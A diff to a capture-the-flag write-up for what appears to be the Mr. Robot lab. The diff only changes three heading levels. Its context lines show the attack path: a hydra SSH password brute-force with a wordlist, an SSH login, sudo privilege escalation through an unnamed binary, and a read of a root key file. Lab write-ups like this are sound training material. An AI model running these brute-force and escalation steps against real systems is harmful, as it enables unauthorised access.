@@ -42,7 +42,7 @@
 2. /fsocity.dic
 3. /key-1-of-3.txt
 
-## 🏁 Flag 1
+### 🏁 Flag 1
 ### Accessing:
 
 - http://<TARGET_IP>/key-1-of-3.txt
@@ -54,7 +54,7 @@
 - hydra -l elliot -P fsocity.dic ssh://<TARGET_IP>
 Password found for user elliot.
 
-## 🏁 Flag 2
+### 🏁 Flag 2
 ### Logged in via SSH:
 - ssh elliot@<TARGET_IP>
 
@@ -70,7 +70,7 @@ Password found for user elliot.
 3. Exploited it to gain root access:
 4. sudo <vulnerable_binary>
 
-## 🏁 Flag 3 (Root)
+### 🏁 Flag 3 (Root)
 1. cat /root/key-3-of-3.txt
 ✅ Flag 3 obtained
 
